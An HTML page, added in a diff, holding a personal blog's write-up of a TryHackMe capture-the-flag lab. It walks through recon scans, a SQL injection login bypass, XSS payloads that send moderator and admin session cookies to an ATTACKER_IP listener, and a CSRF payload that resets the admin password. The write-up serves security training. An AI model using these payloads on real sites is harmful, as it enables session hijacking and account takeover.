@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>What's Your Name | Jenn Shagrin</title>
+<meta name="description" content="TryHackMe CTF — JavaScript inspection, SQLi auth bypass, XSS cookie theft chained across moderator and admin, CSRF via chat XSS to force admin password reset.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/whats-your-name.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/whats-your-name.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="What's Your Name">
+<meta property="og:description" content="TryHackMe CTF — SQLi auth bypass, XSS cookie theft chained across moderator and admin, CSRF via chat XSS to force admin password reset.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="What's Your Name">
+<meta name="twitter:description" content="TryHackMe CTF — SQLi auth bypass, XSS cookie theft chained across moderator and admin, CSRF via chat XSS to force admin password reset.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">What&rsquo;s Your Name</h1>
+    <div class="post-description">TryHackMe CTF &mdash; Client-side exploitation challenge built around JavaScript inspection, cookie manipulation, and XSS chaining. The synopsis warns against clicking links from unknown sources. If I can&rsquo;t pull off the very thing I&rsquo;m being warned about, I have a much bigger problem. Let&rsquo;s go.</div>
+  </header>
+
+  <div class="post-content">
+
+<hr>
+
+<h2>Recon</h2>
+
+<p>Added the target to <code>/etc/hosts</code> first.</p>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-25 at 8.12.28 AM.png" alt="hosts file with worldwap.thm added" style="max-width:100%;margin:2rem 0;">
+
+<p>Cardi B is clearly our hacker, but I&rsquo;ll play along with this charade.</p>
+
+<p>I was feeling Rustscan, but ran nmap to follow the rules:</p>
+
+<pre><code>nmap -A -T4 -p- TARGET_IP</code></pre>
+
+<pre><code>nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP -oN whats_your_name_nmap_result.txt</code></pre>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-25 at 8.42.11 AM.png" alt="nmap full scan results" style="max-width:100%;margin:2rem 0;">
+
+<p>Sneaky, Port 53. I see you.</p>
+
+<p>Open ports: 22 (SSH), 53, 80 (HTTP), 8081 (HTTP). Port 8081 is the non-standard one. Worth fuzzing.</p>
+
+<pre><code>feroxbuster -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 -o ferox_out.txt</code></pre>
+
+<p>I love to watch this run. Dopamine city.</p>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-25 at 10.04.12 AM.png" alt="feroxbuster results" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;ve shorn all the fuzz needed.</p>
+
+<p>Filtering signal from noise on the scan:</p>
+
+<table>
+<thead>
+<tr><th>Endpoint</th><th>Significance</th></tr>
+</thead>
+<tbody>
+<tr><td><code>/phpmyadmin/</code></td><td>Default creds attack surface (root:no password, root:root, admin:admin)</td></tr>
+<tr><td><code>/setup.php</code></td><td>149 bytes. Likely a one-time setup script. Browser-first</td></tr>
+<tr><td><code>/logs.txt</code></td><td>0 bytes. Writable potentially</td></tr>
+<tr><td><code>/db.php</code></td><td>0 bytes. Included by other files</td></tr>
+<tr><td><code>/clear.php</code></td><td>4 bytes. Probably clears session or logs</td></tr>
+</tbody>
+</table>
+
+<p>Given the synopsis hints at JS inspection, cookie manipulation, and XSS, the cookie angle is the most likely path.</p>
+
+<hr>
+
+<h2>Setup.php and the Database Reset</h2>
+
+<p>Visiting <code>setup.php</code> re-initialized the entire database. View source confirmed a <code>users</code> table and a <code>messages</code> table, with default accounts inserted.</p>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-25 at 10.29.46 AM.png" alt="setup.php source revealing schema" style="max-width:100%;margin:2rem 0;">
+
+<p>A clean slate with predictable defaults. Worth a phpMyAdmin attempt before pivoting to the main app.</p>
+
+<hr>
+
+<h2>phpMyAdmin Tangent</h2>
+
+<p>Tried the obvious default credentials at <code>/phpmyadmin/</code>. None worked, but the error confirmed <code>admin</code> exists as a MySQL user.</p>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-25 at 11.29.29 AM.png" alt="phpMyAdmin login error confirming admin user" style="max-width:100%;margin:2rem 0;">
+
+<p>This felt like a mind-honeypot. The lab&rsquo;s stated focus was JS inspection and cookie manipulation, not a MySQL credential brute force. Tab stayed open just in case. Pivoting to the main app.</p>
+
+<hr>
+
+<h2>SQLi at login.php</h2>
+
+<pre><code>http://worldwap.thm:8081/login.php</code></pre>
+
+<p>There&rsquo;s something very seductive about a nicely colored, nondescript login page. It&rsquo;s giving me a come-hither stare.</p>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-26 at 11.16.49 AM.png" alt="login.php interface" style="max-width:100%;margin:2rem 0;">
+
+<p>Intercepted a login request via Burp with <code>admin:password</code>. The failed login returned a 200, not a 302, meaning it re-renders the login page rather than redirecting. PHPSESSID was set on failed login, which is normal PHP behavior and not directly manipulable. The cookie hint clearly applied after a successful login.</p>
+
+<p>In summary, find a successful login.</p>
+
+<p>Sent the request to Repeater and tried a SQLi auth bypass:</p>
+
+<pre><code>username=admin'-- -&amp;password=anything</code></pre>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-26 at 11.35.43 AM.png" alt="Burp Repeater showing 302 redirect to profile.php" style="max-width:100%;margin:2rem 0;">
+
+<p>302 redirect to <code>profile.php</code>. Bypass confirmed.</p>
+
+<hr>
+
+<h2>Recognizing the XSS Vector</h2>
+
+<p>Visited <code>worldwap.thm:80</code> and clicked the register button.</p>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-26 at 11.43.02 AM.png" alt="registration page with reviewed by moderator notice" style="max-width:100%;margin:2rem 0;">
+
+<p>The &ldquo;Reviewed by the site moderator&rdquo; notice is the entire game. Translation:</p>
+
+<ol>
+<li>Register with an XSS payload in a field, like Name</li>
+<li>Moderator reviews the registration in their browser</li>
+<li>Their browser executes the payload</li>
+<li>Payload exfiltrates their session cookie to my listener</li>
+<li>I hijack the moderator session</li>
+</ol>
+
+<hr>
+
+<h2>Stage 1: Hijacking the Moderator</h2>
+
+<p>Set up a Python listener on the attacker VM:</p>
+
+<pre><code>python3 -m http.server 8000</code></pre>
+
+<p>Registered with this payload in the Name field:</p>
+
+<pre><code>&lt;script&gt;document.location='http://ATTACKER_IP:8000/?c='+document.cookie&lt;/script&gt;</code></pre>
+
+<p>Other fields filled with junk. Password: <code>junkyjunk</code>.</p>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-26 at 11.54.35 AM.png" alt="registration submitted with XSS payload" style="max-width:100%;margin:2rem 0;">
+
+<p>The payload is planted. Now we have the come-hither advantage.</p>
+
+<p>When the moderator bot &ldquo;reviewed&rdquo; my registration, the payload fired and the GET request hit the Python listener with their cookie in the URL.</p>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-26 at 11.58.11 AM.png" alt="Python listener catching moderator cookie" style="max-width:100%;margin:2rem 0;">
+
+<p>The cookie jar has been successfully raided.</p>
+
+<p>Replaced the PHPSESSID in DevTools &gt; Storage &gt; Cookies with <code>0edomi6olajr10e5rr8292gg8u</code>.</p>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-26 at 12.05.01 PM.png" alt="DevTools cookie replacement" style="max-width:100%;margin:2rem 0;">
+
+<p>DNS resolution to <code>worldwap.thm</code> was being finicky from the browser, so I bypassed with curl:</p>
+
+<pre><code>curl -b "PHPSESSID=0edomi6olajr10e5rr8292gg8u" http://TARGET_IP/profile.php</code></pre>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-26 at 12.17.14 PM.png" alt="curl returning moderator profile with flag" style="max-width:100%;margin:2rem 0;">
+
+<p>Look at me predicting the future. Pwned, indeed.</p>
+
+<p><strong>Moderator flag:</strong> <code>ModP@wnEd</code></p>
+
+<hr>
+
+<h2>Stage 2: Hijacking the Admin</h2>
+
+<p>The moderator profile rendered the admin area as <code>Admin Area (You dont have the access !)</code>. That access notice means the panel exists, the moderator just isn&rsquo;t authorized. Same XSS pattern, different delivery.</p>
+
+<pre><code>curl -b "PHPSESSID=0edomi6olajr10e5rr8292gg8u" http://TARGET_IP/admin.php</code></pre>
+
+<p>That returned a 404. They&rsquo;re not that savvy. The panel had to be reachable elsewhere, and the moderator&rsquo;s profile hinted at <code>chat.php</code> as the place admins reviewed messages.</p>
+
+<p>Confirmed <code>chat.php</code> was the right delivery vector by inspecting form fields:</p>
+
+<pre><code>curl -b "PHPSESSID=0edomi6olajr10e5rr8292gg8u" http://TARGET_IP/chat.php | grep -i "form\|input\|action\|message\|send"</code></pre>
+
+<img src="/images/whats-your-name/Pasted image 20260426123224.png" alt="chat.php form analysis showing innerHTML rendering" style="max-width:100%;margin:2rem 0;">
+
+<p>Two findings made this exploitable:</p>
+
+<ul>
+<li>The form POSTs to <code>chat.php</code> with a <code>message</code> field</li>
+<li>The receiving JS does <code>messageDiv.innerHTML = msg.message</code>. Raw HTML rendering, no sanitization. XSS confirmed.</li>
+</ul>
+
+<p>With the listener still running, fired the payload as a chat message:</p>
+
+<pre><code>curl -b "PHPSESSID=0edomi6olajr10e5rr8292gg8u" \
+  -d "message=&lt;script&gt;document.location='http://ATTACKER_IP:8000/?c='+document.cookie&lt;/script&gt;" \
+  http://TARGET_IP/chat.php</code></pre>
+
+<p>The page has a &ldquo;Reset/Move Admin Bot to chat.php&rdquo; button that forces the admin bot to visit. Clicked it. The bot&rsquo;s browser rendered the message, executed the script, and dropped its cookie into the listener.</p>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-26 at 12.41.50 PM.png" alt="Python listener catching admin cookie" style="max-width:100%;margin:2rem 0;">
+
+<p><code>PHPSESSID=17rnjlupi9ljoej9gaofua8p1j</code> was the admin ticket.</p>
+
+<p>But hitting <code>admin.php</code> with the admin cookie still didn&rsquo;t return the flag. Cookie alone wasn&rsquo;t enough. The admin panel was protected by something the cookie didn&rsquo;t satisfy on its own.</p>
+
+<hr>
+
+<h2>Stage 3: CSRF for Admin Password Reset</h2>
+
+<p>The admin had <code>change_password.php</code> accessible, and any POST to it with the admin&rsquo;s cookie would change the admin&rsquo;s password. I just needed the admin&rsquo;s browser to fire that POST. CSRF, delivered via the same chat.php XSS vector.</p>
+
+<p>Inspected the change_password.php form fields first:</p>
+
+<pre><code>curl -s -b "PHPSESSID=ADMIN_COOKIE" http://TARGET_IP/change_password.php</code></pre>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-26 at 1.40.27 PM.png" alt="change_password.php form fields" style="max-width:100%;margin:2rem 0;">
+
+<p>One field: <code>new_password</code>. POSTs to <code>change_password.php</code>. Pwned once again.</p>
+
+<p>Sent the CSRF payload as a chat message. The <code>img onerror</code> pattern is more reliable than <code>&lt;script&gt;</code> for CSRF in some browsers because it fires immediately on render:</p>
+
+<pre><code>curl -b "PHPSESSID=MOD_COOKIE" \
+  -d 'message=&lt;img src="x" onerror="fetch(`http://worldwap.thm:8081/change_password.php`,{method:`POST`,credentials:`include`,headers:{`Content-Type`:`application/x-www-form-urlencoded`},body:`new_password=admin123`});"&gt;' \
+  http://TARGET_IP:8081/chat.php</code></pre>
+
+<p>Clicked &ldquo;Reset/Move admin bot to chat.php&rdquo; again. The admin bot loaded the message, the <code>img</code> tag fired the <code>onerror</code> handler, the fetch went out with <code>credentials: 'include'</code>, and the admin&rsquo;s own browser POSTed <code>new_password=admin123</code> to <code>change_password.php</code> with the admin&rsquo;s cookie attached.</p>
+
+<p>Headed to <code>http://TARGET_IP:8081/login.php</code> and tried <code>admin / admin123</code>.</p>
+
+<img src="/images/whats-your-name/Screenshot 2026-04-26 at 2.31.19 PM.png" alt="logged in as admin" style="max-width:100%;margin:2rem 0;">
+
+<p>In as admin. Three-stage chain complete.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>nmap + feroxbuster &rarr; port 8081, /setup.php, /phpmyadmin, /chat.php, /change_password.php
+&rarr; setup.php confirmed schema reset and predictable default accounts
+&rarr; phpMyAdmin honeypot identified, parked
+&rarr; login.php SQLi auth bypass: admin'-- - &rarr; 302 to profile.php
+&rarr; Registration "Reviewed by moderator" tell &rarr; XSS in Name field
+&rarr; Python listener + document.cookie payload &rarr; moderator PHPSESSID stolen
+&rarr; Cookie swap &rarr; curl bypass DNS &rarr; moderator profile + flag
+&rarr; Admin Area exists in moderator profile but inaccessible directly
+&rarr; chat.php innerHTML raw rendering &rarr; XSS payload via curl POST
+&rarr; Reset/Move Admin Bot button triggers bot visit &rarr; admin PHPSESSID stolen
+&rarr; Admin cookie alone insufficient for admin.php
+&rarr; change_password.php CSRF: img onerror + fetch credentials:include via chat XSS
+&rarr; Admin bot&rsquo;s browser POSTs new_password=admin123 with admin&rsquo;s cookie
+&rarr; Login as admin / admin123 &rarr; admin access</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
